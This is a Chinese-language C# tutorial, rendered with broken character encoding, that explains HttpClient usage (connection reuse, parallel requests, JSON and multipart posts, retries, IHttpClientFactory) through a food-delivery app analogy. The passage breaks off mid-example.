blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">æƒ³è±¡ä½ è¦ç‚¹å¤–å–</h2>
<p><strong>ä¼ ç»Ÿæ–¹å¼ï¼ˆåƒæ‰“ç”µè¯è®¢é¤ï¼‰ï¼š</strong></p>
<p>csharp</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// æ¯æ¬¡éƒ½è¦ï¼šæ‰¾é¤å…ç”µè¯â†’æ‰“ç”µè¯â†’ç­‰æ¥é€šâ†’ç‚¹é¤â†’ç­‰ç¡®è®¤â†’æŒ‚ç”µè¯</span>
<span class="hljs-comment">// æƒ³å†ç‚¹ä¸€æ¯é¥®æ–™ï¼Ÿé‡æ–°æ‰“ä¸€éç”µè¯ï¼</span>
public void ä¼ ç»Ÿç‚¹é¤()
{
    <span class="hljs-comment">// ç¬¬ä¸€æ¬¡ï¼šç‚¹ä¸»é£Ÿ</span>
    æ‰¾ç”µè¯å·ç ("è‚¯å¾·åŸº");
    æ‰“ç”µè¯("æˆ‘è¦ä¸€ä¸ªæ±‰å ¡");
    ç­‰å¾…æ¥é€š();
    è¯´æ˜éœ€æ±‚();
    ç­‰å¾…ç¡®è®¤();
    æŒ‚æ–­ç”µè¯();
    
    <span class="hljs-comment">// ç¬¬äºŒæ¬¡ï¼šç‚¹é¥®æ–™ï¼ˆåˆè¦é‡å¤æ‰€æœ‰æ­¥éª¤ï¼‰</span>
    æ‰¾ç”µè¯å·ç ("è‚¯å¾·åŸº");
    æ‰“ç”µè¯("å†åŠ ä¸€æ¯å¯ä¹");
    ç­‰å¾…æ¥é€š();
    è¯´æ˜éœ€æ±‚();
    ç­‰å¾…ç¡®è®¤();
    æŒ‚æ–­ç”µè¯();
    
    <span class="hljs-comment">// ç¬¬ä¸‰æ¬¡ï¼šæŸ¥è®¢å•çŠ¶æ€ï¼ˆè¿˜å¾—å†æ‰“ï¼‰</span>
    æ‰¾ç”µè¯å·ç ("è‚¯å¾·åŸº");
    æ‰“ç”µè¯("æˆ‘çš„é¤åˆ°å“ªäº†");
    <span class="hljs-comment">// ... æ•ˆç‡æä½ï¼</span>
}
</code></pre>
<p><strong>ä½¿ç”¨HttpClientï¼ˆåƒç”¨å¤–å–APPï¼‰ï¼š</strong></p>
<p>csharp</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// å°±åƒåœ¨ç¾å›¢APPé‡Œæ“ä½œ</span>
HttpClient æˆ‘çš„å¤–å–APP = <span class="hljs-keyword">new</span> HttpClient();

<span class="hljs-comment">// ä¸€æ¬¡è®¾ç½®ï¼Œå¤šæ¬¡ä½¿ç”¨</span>
æˆ‘çš„å¤–å–APP.BaseAddress = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uri</span>(<span class="hljs-string">"https://api.kfc.com/"</span>);

<span class="hljs-keyword">async</span> Task æ™ºèƒ½ç‚¹é¤()
{
    <span class="hljs-comment">// ç‚¹ä¸»é£Ÿï¼ˆåƒåœ¨APPé‡Œé€‰å•†å“ï¼‰</span>
    <span class="hljs-keyword">var</span> æ±‰å ¡è®¢å• = <span class="hljs-keyword">await</span> æˆ‘çš„å¤–å–APP.PostAsync(<span class="hljs-string">"order"</span>, æ±‰å ¡æ•°æ®);
    
    <span class="hljs-comment">// åŠ é¥®æ–™ï¼ˆç›´æ¥åœ¨è®¢å•é‡Œæ·»åŠ ï¼Œä¸ç”¨é‡æ–°æ‰“å¼€ï¼‰</span>
    <span class="hljs-keyword">var</span> é¥®æ–™è®¢å• = <span class="hljs-keyword">await</span> æˆ‘çš„å¤–å–APP.PostAsync(<span class="hljs-string">"order/add"</span>, å¯ä¹æ•°æ®);
    
    <span class="hljs-comment">// æŸ¥è¿›åº¦ï¼ˆåˆ·æ–°ä¸€ä¸‹å°±è¡Œï¼‰</span>
    <span class="hljs-keyword">var</span> è®¢å•çŠ¶æ€ = <span class="hljs-keyword">await</span> æˆ‘çš„å¤–å–APP.GetAsync(<span class="hljs-string">"order/status"</span>);
    
    <span class="hljs-comment">// æ‰€æœ‰æ“ä½œéƒ½åœ¨åŒä¸€ä¸ªAPPé‡Œå®Œæˆï¼Œä¸ç”¨åå¤"æ‰“ç”µè¯"</span>
}
</code></pre>
<h2 data-id="heading-1">HttpClientçš„æ ¸å¿ƒåŠŸèƒ½ï¼ˆåƒå¤–å–APPçš„ç‰¹æ€§ï¼‰</h2>
<h3 data-id="heading-2">1.Â <strong>è¿æ¥å¤ç”¨</strong>Â - ä¸ç”¨åå¤ç™»å½•</h3>
<p>csharp</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// âŒ ä¼ ç»Ÿï¼šæ¯æ¬¡éƒ½è¦é‡æ–°ç™»å½•</span>
public void ä¼ ç»Ÿæ–¹å¼()
{
    <span class="hljs-comment">// ç‚¹é¤</span>
    æ‰“å¼€<span class="hljs-built_in">APP</span>();
    ç™»å½•();
    ç‚¹é¤();
    é€€å‡º<span class="hljs-built_in">APP</span>();
    
    <span class="hljs-comment">// æŸ¥è®¢å•ï¼ˆåˆè¦é‡æ–°ç™»å½•ï¼‰</span>
    æ‰“å¼€<span class="hljs-built_in">APP</span>();
    ç™»å½•();
    æŸ¥è®¢å•();
    é€€å‡º<span class="hljs-built_in">APP</span>();
}

<span class="hljs-comment">// âœ… HttpClientï¼šä¸€æ¬¡ç™»å½•ï¼ŒæŒç»­ä½¿ç”¨</span>
public class æˆ‘çš„å¤–å–æœåŠ¡
{
    private HttpClient å¤–å–APP = new <span class="hljs-built_in">HttpClient</span>();
    
    public æˆ‘çš„å¤–å–æœåŠ¡()
    {
        <span class="hljs-comment">// åªéœ€è¦ç™»å½•ä¸€æ¬¡</span>
        å¤–å–APP<span class="hljs-selector-class">.BaseAddress</span> = new <span class="hljs-built_in">Uri</span>("https://å¤–å–å¹³å°.com/");
        å¤–å–APP<span class="hljs-selector-class">.DefaultRequestHeaders</span><span class="hljs-selector-class">.Add</span>("Authorization", "æˆ‘çš„ç™»å½•å‡­è¯");
    }
    
    public async Task ç‚¹é¤() =&gt; await å¤–å–APP<span class="hljs-selector-class">.PostAsync</span>(...);
    public async Task æŸ¥è®¢å•() =&gt; await å¤–å–APP<span class="hljs-selector-class">.GetAsync</span>(...);
    public async Task å–æ¶ˆè®¢å•() =&gt; await å¤–å–APP<span class="hljs-selector-class">.DeleteAsync</span>(...);
    <span class="hljs-comment">// æ‰€æœ‰æ“ä½œéƒ½ç”¨åŒä¸€ä¸ªç™»å½•çŠ¶æ€</span>
}
</code></pre>
<h3 data-id="heading-3">2.Â <strong>åŒæ—¶å¤„ç†å¤šä¸ªè¯·æ±‚</strong>Â - å¹¶è¡Œç‚¹å¤šå®¶é¤å…</h3>
<p>csharp</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">async</span> Task ç‚¹å‘¨æœ«å¤§é¤()
{
    <span class="hljs-comment">// åŒæ—¶å‘å¤šå®¶é¤å…ä¸‹å•</span>
    <span class="hljs-keyword">var</span> è‚¯å¾·åŸºä»»åŠ¡ = æˆ‘çš„å¤–å–APP.PostAsync(<span class="hljs-string">"kfc/order"</span>, ç‚¸é¸¡æ•°æ®);
    <span class="hljs-keyword">var</span> éº¦å½“åŠ³ä»»åŠ¡ = æˆ‘çš„å¤–å–APP.PostAsync(<span class="hljs-string">"mcdonald/order"</span>, æ±‰å ¡æ•°æ®);
    <span class="hljs-keyword">var</span> å¥¶èŒ¶åº—ä»»åŠ¡ = æˆ‘çš„å¤–å–APP.PostAsync(<span class="hljs-string">"milktea/order"</span>, å¥¶èŒ¶æ•°æ®);
    
    <span class="hljs-comment">// ç­‰å¾…æ‰€æœ‰é¤å…æ¥å•ï¼ˆå¹¶è¡Œç­‰å¾…ï¼Œæ•ˆç‡é«˜ï¼‰</span>
    <span class="hljs-keyword">await</span> Task.WhenAll(è‚¯å¾·åŸºä»»åŠ¡, éº¦å½“åŠ³ä»»åŠ¡, å¥¶èŒ¶åº—ä»»åŠ¡);
    
    Console.WriteLine(<span class="hljs-string">"æ‰€æœ‰è®¢å•å·²æäº¤ï¼"</span>);
}
</code></pre>
<h3 data-id="heading-4">3.Â <strong>å‘é€å„ç§ç±»å‹çš„æ•°æ®</strong>Â - ä¸åªæ˜¯æ–‡å­—</h3>
<p>csharp</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">async</span> Task æäº¤è®¢å•()
{
    <span class="hljs-comment">// 1. å‘é€JSONæ•°æ®ï¼ˆåƒå¡«å†™è¯¦ç»†çš„é…é€ä¿¡æ¯ï¼‰</span>
    <span class="hljs-keyword">var</span> è®¢å•ä¿¡æ¯ = <span class="hljs-keyword">new</span> 
    {
        å•†å“ = <span class="hljs-string">"é¦™è¾£é¸¡è…¿å ¡å¥—é¤"</span>,
        æ•°é‡ = <span class="hljs-number">1</span>,
        åœ°å€ = <span class="hljs-string">"åŒ—äº¬å¸‚æœé˜³åŒºxxx"</span>,
        å¤‡æ³¨ = <span class="hljs-string">"ä¸è¦è¾£æ¤’ï¼Œå¿«ç‚¹é€"</span>
    };
    
    <span class="hljs-keyword">var</span> jsonå†…å®¹ = <span class="hljs-keyword">new</span> StringContent(
        JsonSerializer.Serialize(è®¢å•ä¿¡æ¯),
        Encoding.UTF8,
        <span class="hljs-string">"application/json"</span>);  <span class="hljs-comment">// å‘Šè¯‰æœåŠ¡å™¨è¿™æ˜¯JSONæ ¼å¼</span>
    
    <span class="hljs-keyword">await</span> æˆ‘çš„å¤–å–APP.PostAsync(<span class="hljs-string">"order"</span>, jsonå†…å®¹);
    
    <span class="hljs-comment">// 2. å‘é€è¡¨å•æ•°æ®ï¼ˆåƒå¡«å†™ç®€å•é—®å·ï¼‰</span>
    <span class="hljs-keyword">var</span> è¡¨å•æ•°æ® = <span class="hljs-keyword">new</span> FormUrlEncodedContent(<span class="hljs-keyword">new</span>[]
    {
        <span class="hljs-keyword">new</span> KeyValuePair&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">string</span>&gt;(<span class="hljs-string">"rating"</span>, <span class="hljs-string">"5"</span>),
        <span class="hljs-keyword">new</span> KeyValuePair&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">string</span>&gt;(<span class="hljs-string">"comment"</span>, <span class="hljs-string">"å¾ˆå¥½åƒ"</span>)
    });
    
    <span class="hljs-keyword">await</span> æˆ‘çš„å¤–å–APP.PostAsync(<span class="hljs-string">"feedback"</span>, è¡¨å•æ•°æ®);
    
    <span class="hljs-comment">// 3. ä¸Šä¼ æ–‡ä»¶ï¼ˆåƒå‘é€å‘ç¥¨ç…§ç‰‡ï¼‰</span>
    <span class="hljs-keyword">using</span> <span class="hljs-keyword">var</span> ç…§ç‰‡æµ = File.OpenRead(<span class="hljs-string">"å‘ç¥¨.jpg"</span>);
    <span class="hljs-keyword">var</span> æ–‡ä»¶å†…å®¹ = <span class="hljs-keyword">new</span> StreamContent(ç…§ç‰‡æµ);
    
    <span class="hljs-keyword">var</span> å¤šéƒ¨åˆ†å†…å®¹ = <span class="hljs-keyword">new</span> MultipartFormDataContent
    {
        { <span class="hljs-keyword">new</span> StringContent(<span class="hljs-string">"12345"</span>), <span class="hljs-string">"orderId"</span> },
        { æ–‡ä»¶å†…å®¹, <span class="hljs-string">"invoice"</span>, <span class="hljs-string">"å‘ç¥¨.jpg"</span> }
    };
    
    <span class="hljs-keyword">await</span> æˆ‘çš„å¤–å–APP.PostAsync(<span class="hljs-string">"upload/invoice"</span>, å¤šéƒ¨åˆ†å†…å®¹);
}
</code></pre>
<h2 data-id="heading-5">å®Œæ•´çš„å¤–å–APPç¤ºä¾‹</h2>
<p>csharp</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> æ™ºèƒ½å¤–å–ç®¡å®¶
{
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> HttpClient æˆ‘çš„APP;
    
    <span class="hljs-keyword">public</span> æ™ºèƒ½å¤–å–ç®¡å®¶()
    {
        æˆ‘çš„APP = <span class="hljs-keyword">new</span> HttpClient
        {
            BaseAddress = <span class="hljs-keyword">new</span> Uri(<span class="hljs-string">"https://api.food-delivery.com/v1/"</span>),
            Timeout = TimeSpan.FromSeconds(<span class="hljs-number">30</span>)  <span class="hljs-comment">// 30ç§’æ²¡å“åº”å°±å–æ¶ˆ</span>
        };
        
        <span class="hljs-comment">// è®¾ç½®APPçš„é€šç”¨é…ç½®</span>
        æˆ‘çš„APP.DefaultRequestHeaders.Add(<span class="hljs-string">"User-Agent"</span>, <span class="hljs-string">"MyFoodApp/1.0"</span>);
        æˆ‘çš„APP.DefaultRequestHeaders.Add(<span class="hljs-string">"X-API-Key"</span>, <span class="hljs-string">"my_secret_key"</span>);
    }
    
    <span class="hljs-comment">// æœç´¢é¤å…</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">async</span> Task&lt;List&lt;é¤å…&gt;&gt; æœç´¢é¤å…(<span class="hljs-built_in">string</span> å…³é”®è¯, <span class="hljs-built_in">string</span> åœ°å€)
    {
        <span class="hljs-built_in">string</span> url = <span class="hljs-string">$"restaurants?keyword=<span class="hljs-subst">{å…³é”®è¯}</span>&amp;address=<span class="hljs-subst">{åœ°å€}</span>"</span>;
        <span class="hljs-keyword">var</span> å“åº” = <span class="hljs-keyword">await</span> æˆ‘çš„APP.GetAsync(url);
        
        å“åº”.EnsureSuccessStatusCode();  <span class="hljs-comment">// å¦‚æœå¤±è´¥å°±æŠ›å‡ºå¼‚å¸¸</span>
        
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">await</span> å“åº”.Content.ReadFromJsonAsync&lt;List&lt;é¤å…&gt;&gt;();
    }
    
    <span class="hljs-comment">// ä¸‹å•</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">async</span> Task&lt;è®¢å•ç»“æœ&gt; ä¸‹å•(è®¢å• æ–°è®¢å•)
    {
        <span class="hljs-keyword">var</span> å†…å®¹ = <span class="hljs-keyword">new</span> StringContent(
            JsonSerializer.Serialize(æ–°è®¢å•),
            Encoding.UTF8,
            <span class="hljs-string">"application/json"</span>);
        
        <span class="hljs-keyword">var</span> å“åº” = <span class="hljs-keyword">await</span> æˆ‘çš„APP.PostAsync(<span class="hljs-string">"orders"</span>, å†…å®¹);
        
        <span class="hljs-keyword">if</span> (!å“åº”.IsSuccessStatusCode)
        {
            <span class="hljs-comment">// å¤„ç†å¤±è´¥æƒ…å†µ</span>
            <span class="hljs-keyword">var</span> é”™è¯¯ä¿¡æ¯ = <span class="hljs-keyword">await</span> å“åº”.Content.ReadAsStringAsync();
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> Exception(<span class="hljs-string">$"ä¸‹å•å¤±è´¥ï¼š<span class="hljs-subst">{é”™è¯¯ä¿¡æ¯}</span>"</span>);
        }
        
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">await</span> å“åº”.Content.ReadFromJsonAsync&lt;è®¢å•ç»“æœ&gt;();
    }
    
    <span class="hljs-comment">// è·Ÿè¸ªè®¢å•</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">async</span> Task&lt;é…é€çŠ¶æ€&gt; æŸ¥çœ‹é…é€çŠ¶æ€(<span class="hljs-built_in">string</span> è®¢å•å·)
    {
        <span class="hljs-keyword">var</span> å“åº” = <span class="hljs-keyword">await</span> æˆ‘çš„APP.GetAsync(<span class="hljs-string">$"orders/<span class="hljs-subst">{è®¢å•å·}</span>/tracking"</span>);
        
        <span class="hljs-keyword">if</span> (å“åº”.StatusCode == HttpStatusCode.NotFound)
        {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> Exception(<span class="hljs-string">"è®¢å•ä¸å­˜åœ¨"</span>);
        }
        
        å“åº”.EnsureSuccessStatusCode();
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">await</span> å“åº”.Content.ReadFromJsonAsync&lt;é…é€çŠ¶æ€&gt;();
    }
    
    <span class="hljs-comment">// æ‰¹é‡æ“ä½œï¼šæ”¶è—å¤šå®¶é¤å…</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">async</span> Task æ‰¹é‡æ”¶è—é¤å…(List&lt;<span class="hljs-built_in">string</span>&gt; é¤å…IDåˆ—è¡¨)
    {
        <span class="hljs-keyword">var</span> ä»»åŠ¡åˆ—è¡¨ = <span class="hljs-keyword">new</span> List&lt;Task&gt;();
        
        <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">var</span> é¤å…ID <span class="hljs-keyword">in</span> é¤å…IDåˆ—è¡¨)
        {
            <span class="hljs-keyword">var</span> ä»»åŠ¡ = æˆ‘çš„APP.PostAsync(<span class="hljs-string">$"restaurants/<span class="hljs-subst">{é¤å…ID}</span>/favorite"</span>, <span class="hljs-literal">null</span>);
            ä»»åŠ¡åˆ—è¡¨.Add(ä»»åŠ¡);
        }
        
        <span class="hljs-comment">// åŒæ—¶å‘é€æ‰€æœ‰æ”¶è—è¯·æ±‚</span>
        <span class="hljs-keyword">await</span> Task.WhenAll(ä»»åŠ¡åˆ—è¡¨);
        Console.WriteLine(<span class="hljs-string">"æ‰€æœ‰é¤å…å·²æ”¶è—ï¼"</span>);
    }
}
</code></pre>
<h2 data-id="heading-6">å®é™…ä½¿ç”¨åœºæ™¯</h2>
<h3 data-id="heading-7">åœºæ™¯1ï¼šè·å–å¤©æ°”æ¥å†³å®šç‚¹ä»€ä¹ˆ</h3>
<p>csharp</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">async</span> Task æ™ºèƒ½æ¨è()
{
    <span class="hljs-comment">// å…ˆæŸ¥å¤©æ°”</span>
    <span class="hljs-keyword">var</span> å¤©æ°”å“åº” = <span class="hljs-keyword">await</span> æˆ‘çš„å¤–å–APP.GetAsync(<span class="hljs-string">"https://api.weather.com/åŒ—äº¬"</span>);
    <span class="hljs-keyword">var</span> å¤©æ°”æ•°æ® = <span class="hljs-keyword">await</span> å¤©æ°”å“åº”.Content.ReadFromJsonAsync&lt;å¤©æ°”ä¿¡æ¯&gt;();
    
    <span class="hljs-comment">// æ ¹æ®å¤©æ°”æ¨è</span>
    <span class="hljs-built_in">string</span> æ¨èé¤å“;
    <span class="hljs-keyword">if</span> (å¤©æ°”æ•°æ®.æ¸©åº¦ &lt; <span class="hljs-number">10</span>)
        æ¨èé¤å“ = <span class="hljs-string">"ç«é”…"</span>;
    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (å¤©æ°”æ•°æ®.æ¸©åº¦ &gt; <span class="hljs-number">30</span>)
        æ¨èé¤å“ = <span class="hljs-string">"å†·é¢"</span>;
    <span class="hljs-keyword">else</span>
        æ¨èé¤å“ = <span class="hljs-string">"ä¾¿å½“"</span>;
    
    <span class="hljs-comment">// æœç´¢æ¨èé¤å“</span>
    <span class="hljs-keyword">var</span> é¤å…åˆ—è¡¨ = <span class="hljs-keyword">await</span> æœç´¢é¤å…(æ¨èé¤å“, <span class="hljs-string">"æˆ‘å®¶åœ°å€"</span>);
    Console.WriteLine(<span class="hljs-string">$"æ ¹æ®å¤©æ°”æ¨èï¼š<span class="hljs-subst">{æ¨èé¤å“}</span>"</span>);
}
</code></pre>
<h3 data-id="heading-8">åœºæ™¯2ï¼šå¤„ç†è¶…æ—¶å’Œé‡è¯•</h3>
<p>csharp</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">async</span> Task&lt;è®¢å•ç»“æœ&gt; ç¨³å®šä¸‹å•(è®¢å• æ–°è®¢å•)
{
    <span class="hljs-built_in">int</span> é‡è¯•æ¬¡æ•° = <span class="hljs-number">0</span>;
    <span class="hljs-built_in">int</span> æœ€å¤§é‡è¯•æ¬¡æ•° = <span class="hljs-number">3</span>;
    
    <span class="hljs-keyword">while</span> (é‡è¯•æ¬¡æ•° &lt; æœ€å¤§é‡è¯•æ¬¡æ•°)
    {
        <span class="hljs-keyword">try</span>
        {
            <span class="hljs-comment">// å°è¯•ä¸‹å•</span>
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">await</span> ä¸‹å•(æ–°è®¢å•);
        }
        <span class="hljs-keyword">catch</span> (HttpRequestException ex) <span class="hljs-keyword">when</span> (ex.StatusCode == HttpStatusCode.RequestTimeout)
        {
            <span class="hljs-comment">// è¶…æ—¶äº†ï¼Œç­‰ä¸€ä¼šå†è¯•</span>
            é‡è¯•æ¬¡æ•°++;
            Console.WriteLine(<span class="hljs-string">$"è¯·æ±‚è¶…æ—¶ï¼Œç¬¬<span class="hljs-subst">{é‡è¯•æ¬¡æ•°}</span>æ¬¡é‡è¯•..."</span>);
            
            <span class="hljs-keyword">if</span> (é‡è¯•æ¬¡æ•° &gt;= æœ€å¤§é‡è¯•æ¬¡æ•°)
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> Exception(<span class="hljs-string">"å¤šæ¬¡å°è¯•å¤±è´¥ï¼Œè¯·æ£€æŸ¥ç½‘ç»œ"</span>);
                
            <span class="hljs-keyword">await</span> Task.Delay(<span class="hljs-number">1000</span> * é‡è¯•æ¬¡æ•°);  <span class="hljs-comment">// ç­‰å¾…æ—¶é—´é€’å¢</span>
        }
        <span class="hljs-keyword">catch</span> (HttpRequestException ex) <span class="hljs-keyword">when</span> (ex.StatusCode == HttpStatusCode.TooManyRequests)
        {
            <span class="hljs-comment">// æœåŠ¡å™¨è¯´è¯·æ±‚å¤ªå¤šäº†ï¼Œç­‰5ç§’å†è¯•</span>
            Console.WriteLine(<span class="hljs-string">"æœåŠ¡å™¨å¿™ï¼Œç­‰å¾…5ç§’..."</span>);
            <span class="hljs-keyword">await</span> Task.Delay(<span class="hljs-number">5000</span>);
        }
    }
    
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> Exception(<span class="hljs-string">"ä¸‹å•å¤±è´¥"</span>);
}
</code></pre>
<h2 data-id="heading-9">HttpClientçš„æœ€ä½³å®è·µ</h2>
<h3 data-id="heading-10">âœ… æ­£ç¡®ï¼šåƒé•¿æœŸä½¿ç”¨ä¸€ä¸ªå¤–å–APP</h3>
<p>csharp</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// åœ¨æ•´ä¸ªåº”ç”¨ç”Ÿå‘½å‘¨æœŸä¸­ä½¿ç”¨åŒä¸€ä¸ªHttpClientå®ä¾‹</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> å…¨å±€å¤–å–æœåŠ¡
{
    <span class="hljs-comment">// é™æ€çš„ï¼Œæ•´ä¸ªåº”ç”¨åªåˆ›å»ºä¸€ä¸ª</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">readonly</span> HttpClient æˆ‘çš„é•¿æœŸAPP = <span class="hljs-keyword">new</span> HttpClient
    {
        BaseAddress = <span class="hljs-keyword">new</span> Uri(<span class="hljs-string">"https://api.food.com/"</span>),
        Timeout = TimeSpan.FromSeconds(<span class="hljs-number">30</span>)
    };
    
    <span class="hljs-comment">// æ‰€æœ‰æ–¹æ³•éƒ½ä½¿ç”¨è¿™ä¸ªå®ä¾‹</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">async</span> Task ç‚¹é¤() =&gt; <span class="hljs-keyword">await</span> æˆ‘çš„é•¿æœŸAPP.PostAsync(...);
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">async</span> Task æŸ¥è®¢å•() =&gt; <span class="hljs-keyword">await</span> æˆ‘çš„é•¿æœŸAPP.GetAsync(...);
}
</code></pre>
<h3 data-id="heading-11">âŒ é”™è¯¯ï¼šåƒæ¯æ¬¡ç‚¹é¤éƒ½ä¸‹è½½ä¸€ä¸ªæ–°APP</h3>
<p>csharp</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> é”™è¯¯çš„ç‚¹é¤æ–¹å¼()
{
    <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++)
    {
        <span class="hljs-comment">// é”™è¯¯ï¼æ¯æ¬¡éƒ½è¦åˆ›å»ºæ–°çš„HttpClient</span>
        <span class="hljs-keyword">var</span> ä¸´æ—¶APP = <span class="hljs-keyword">new</span> HttpClient();
        <span class="hljs-keyword">await</span> ä¸´æ—¶APP.GetAsync(<span class="hljs-string">"https://api.food.com/order"</span>);
        <span class="hljs-comment">// å¿˜è®°é‡Šæ”¾ï¼Œä¼šå¯¼è‡´èµ„æºæ³„éœ²ï¼</span>
        <span class="hljs-comment">// å°±åƒæ‰‹æœºé‡Œè£…äº†10ä¸ªç›¸åŒçš„å¤–å–APP</span>
    }
}
</code></pre>
<h3 data-id="heading-12">âœ… æ›´å¥½ï¼šä½¿ç”¨IHttpClientFactoryï¼ˆåƒå®˜æ–¹åº”ç”¨å•†åº—ï¼‰</h3>
<p>csharp</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// åœ¨Startup.csä¸­é…ç½®</span>
services.<span class="hljs-title class_">AddHttpClient</span>(<span class="hljs-string">"å¤–å–æœåŠ¡"</span>, <span class="hljs-function"><span class="hljs-params">client</span> =&gt;</span>
{
    client.<span class="hljs-property">BaseAddress</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uri</span>(<span class="hljs-string">"https://api.food.com/"</span>);
    client.<span class="hljs-property">DefaultRequestHeaders</span>.<span class="hljs-title class_">Add</span>(<span class="hljs-string">"Accept"</span>, <span class="hljs-string">"application/json"</span>);
});

<span class="hljs-comment">// ä½¿ç”¨æ—¶è·å–</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> è®¢å•æœåŠ¡
{
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> <span class="hljs-title class_">IHttpClientFactory</span> _appå•†åº—;
    
    <span class="hljs-keyword">public</span> è®¢å•æœåŠ¡(<span class="hljs-title class_">IHttpClientFactory</span> appå•†åº—)
    {
        _appå•†åº— = appå•†åº—;
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">async</span> <span class="hljs-title class_">Task</span> å¤„ç†è®¢å•()
    {
        <span class="hljs-comment">// ä»"åº”ç”¨å•†åº—"è·å–ä¸€ä¸ªé…ç½®å¥½çš„HttpClient</span>
        <span class="hljs-keyword">var</span> æˆ‘çš„<span class="hljs-variable constant_">APP</span> = _appå•†åº—.<span class="hljs-title class_">CreateClient</span>(<span class="hljs-string">"å¤–å–æœåŠ¡"</span>);
        
        <span class="hljs-comment">// ä½¿ç”¨å®ƒ</span>
        <span class="hljs-keyword">await</span> æˆ‘çš„<span class="hljs-variable constant_">APP</span>.<span class="hljs-title class_">PostAsync</span>(<span class="hljs-string">"orders"</span>, ...);
        
        <span class="hljs-comment">// ä¸ç”¨æ“å¿ƒé‡Šæ”¾ï¼Œå·¥å‚ä¼šç®¡ç†ç”Ÿå‘½å‘¨æœŸ</span>
    }
}
</code></pre>
<h2 data-id="heading-13">å¸¸è§é—®é¢˜è§£å†³æ–¹æ¡ˆ</h2>
<h3 data-id="heading-14">é—®é¢˜1ï¼šç½‘ç»œä¸ç¨³å®šæ€ä¹ˆåŠï¼Ÿ</h3>
<p>csharp</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">async</span> Task&lt;<span class="hljs-built_in">string</span>&gt; ç¨³å®šè·å–èœå•()
{
    <span class="hljs-keyword">try</span>
    {
        <span class="hljs-comment">// è®¾ç½®åˆç†çš„è¶…æ—¶æ—¶é—´</span>
        æˆ‘çš„APP.Timeout = TimeSpan.FromSeconds(<span class="hljs-number">15</span>);
        
        <span class="hljs-comment">// ä½¿ç”¨CancellationTokenå¯ä»¥ä¸­é€”å–æ¶ˆ</span>
